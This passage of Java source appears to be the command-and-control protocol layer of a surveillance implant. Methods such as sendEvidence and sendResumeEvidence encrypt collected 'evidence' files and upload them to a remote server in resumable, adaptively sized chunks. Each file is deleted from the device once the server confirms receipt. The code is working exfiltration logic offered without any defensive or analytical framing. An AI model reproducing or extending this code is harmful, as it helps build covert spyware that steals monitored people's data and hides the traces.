				Check.log(TAG + " Error: File is empty: " + file); //$NON-NLS-1$
			}

			return true;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG
					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
		}

		final byte[] plainOut = new byte[content.length + 4];

		System.arraycopy(ByteArray.intToByteArray(content.length), 0, plainOut, 0, 4);
		System.arraycopy(content, 0, plainOut, 4, content.length);

		byte[] response = command(Proto.EVIDENCE, plainOut);
		final boolean ret = parseLog(response);

		if (ret) {
			EvidenceCollector.self().remove(file.getFilename());
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
			}

			return false;
		}
	}

	private boolean sendResumeEvidence(AutoFile file) throws TransportException, ProtocolException {
		int chunk = Cfg.PROTOCOL_CHUNK;
		int size = (int) file.getSize();

		final byte[] requestBase = new byte[5 * 4];

		byte[] evid = SHA1Digest.get(file.getFilename().getBytes());
		writeBuf(requestBase, 0, evid, 0, 4);
		writeBuf(requestBase, 12, size);

		byte[] response = command(Proto.EVIDENCE_CHUNK, requestBase);

		int base = parseLogOffset(response);
		boolean full = false;

		if (Cfg.DEBUG) {
			Check.log(TAG
					+ " Info: Sending file: " + EvidenceCollector.decryptName(file.getName()) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
		}

		long timestamp = Utils.getTimeStamp();

		while (base < size) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (sendResumeEvidence), base: %s/%s block: %s", base, size, chunk);
			}
			byte[] content = file.read(base, chunk);
			if (content.length < chunk) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (sendResumeEvidence), smaller read: " + content.length);
				}
			}

			byte[] plainOut = new byte[content.length + 16];

			writeBuf(plainOut, 0, evid, 0, 4);
			writeBuf(plainOut, 4, base);
			writeBuf(plainOut, 8, content.length);
			writeBuf(plainOut, 12, size);
			writeBuf(plainOut, 16, content);

			response = command(Proto.EVIDENCE_CHUNK, plainOut);
			base = parseLogOffset(response);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (sendResumeEvidence), base returned: " + base);
			}
			if (base == size) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (sendResumeEvidence): full");
				}
				full = true;
			}
			if (base <= 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (sendSplitEvidence) Error");
				}
				break;
			}

			long timelaps = Utils.getTimeStamp();
			chunk = adaptChunk(chunk, timestamp, timelaps);
			timestamp = timelaps;
		}

		if (full) {
			EvidenceCollector.self().remove(file.getFilename());
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "error sending file, bailing out"); //$NON-NLS-1$ //$NON-NLS-2$
			}

			return false;
		}
	}

	private int adaptChunk(int chunk, long timestamp, long timelaps) {
		if (timelaps - timestamp > 12000) {
			if (chunk > 1024) {
				chunk /= 2;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (sendResumeEvidence) time: %s decreasing chunk to: %s", (timelaps - timestamp),
							chunk);
				}
			}
		} else if (timelaps - timestamp < 4000) {
			if (chunk < 4 * 1024 * 1024) {
				chunk *= 2;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (sendResumeEvidence) time: %s increasing chunk to: %s", (timelaps - timestamp),
							chunk);
				}
			}
		}
		return chunk;
	}

	private void writeBuf(byte[] buffer, int pos, byte[] content) {
		System.arraycopy(content, 0, buffer, pos, content.length);
	}

	private void writeBuf(byte[] buffer, int pos, int whatever) {
		System.arraycopy(ByteArray.intToByteArray(whatever), 0, buffer, pos, 4);
	}

	private void writeBuf(byte[] buffer, int pos, byte[] whatever, int offset, int len) {
		System.arraycopy(whatever, offset, buffer, pos, len);
	}

	/**
	 * Parses the log.
	 *
	 * @param result the result
	 * @return true, if successful
	 * @throws ProtocolException the protocol exception
	 */
	protected boolean parseLog(final byte[] result) throws ProtocolException {
		return checkOk(result);
	}

	/**
	 * Parses the log.
	 *
	 * @param result the result
	 * @return true, if successful
	 * @throws ProtocolException the protocol exception
	 */
	protected int parseLogOffset(final byte[] result) throws ProtocolException {
		if (checkOk(result)) {
			if (ByteArray.byteArrayToInt(result, 4) == 4) {
				return ByteArray.byteArrayToInt(result, 8);
			}
			return 0;
		}

		return -1;
	}

	/**
	 * Parses the end.
	 *
	 * @param result the result
	 * @throws ProtocolException the protocol exception
	 */
	protected void parseEnd(final byte[] result) throws ProtocolException {
		checkOk(result);
	}

	// ****************************** INTERNALS ***************************** //

	/**
	 * Command.
	 *
	 * @param command the command
	 * @return the byte[]
	 * @throws TransportException the transport exception
	 * @throws ProtocolException  the protocol exception
	 */
	private byte[] command(final int command) throws TransportException, ProtocolException {
		return command(command, new byte[0]);
	}

	/**
	 * Command.
	 *
	 * @param command the command
	 * @param data    the data
	 * @return the byte[]
	 * @throws TransportException the transport exception
	 */
	private byte[] command(final int command, final byte[] data) throws TransportException {
		if (Cfg.DEBUG) {
			Check.requires(cryptoK != null, "cypherCommand: cryptoK null"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(data != null, "cypherCommand: data null"); //$NON-NLS-1$
		}
		final int dataLen = data.length;
		final byte[] plainOut = new byte[dataLen + 4];
		System.arraycopy(ByteArray.intToByteArray(command), 0, plainOut, 0, 4);
		System.arraycopy(data, 0, plainOut, 4, data.length);

		try {
			byte[] plainIn;
			plainIn = cypheredWriteReadSha(plainOut);
			return plainIn;
		} catch (final CryptoException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: scommand: " + e); //$NON-NLS-1$
			}
			throw new TransportException(9);
		}
	}

	/**
	 * Cyphered write read.
	 *
	 * @param plainOut the plain out
	 * @return the byte[]
	 * @throws TransportException the transport exception
	 * @throws CryptoException    the crypto exception
	 */
	private byte[] cypheredWriteRead(final byte[] plainOut) throws TransportException, CryptoException {
		final byte[] cypherOut = cryptoK.encryptData(plainOut);
		final byte[] cypherIn = transport.command(cypherOut);
		final byte[] plainIn = cryptoK.decryptData(cypherIn);
		return plainIn;
	}

	/**
	 * Cyphered write read sha.
	 *
	 * @param plainOut the plain out
	 * @return the byte[]
	 * @throws TransportException the transport exception
	 * @throws CryptoException    the crypto exception
	 */
	private byte[] cypheredWriteReadSha(final byte[] plainOut) throws TransportException, CryptoException {
		final byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
		final byte[] cypherIn = transport.command(cypherOut);

		if (cypherIn.length < SHA1LEN) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: cypheredWriteReadSha: cypherIn sha len error!"); //$NON-NLS-1$
			}
			throw new CryptoException();
		}

		final byte[] plainIn = cryptoK.decryptDataIntegrity(cypherIn);

		return plainIn;

	}

	/**
	 * Check ok.
	 *
	 * @param result the result
	 * @return true, if successful
	 * @throws ProtocolException the protocol exception
	 */
	private boolean checkOk(final byte[] result) throws ProtocolException {
		final int res = ByteArray.byteArrayToInt(result, 0);

		if (res == Proto.OK) {
			return true;
		} else if (res == Proto.NO) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: checkOk: NO"); //$NON-NLS-1$
			}

			return false;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: checkOk: " + res); //$NON-NLS-1$
			}

			throw new ProtocolException();
		}
	}

}
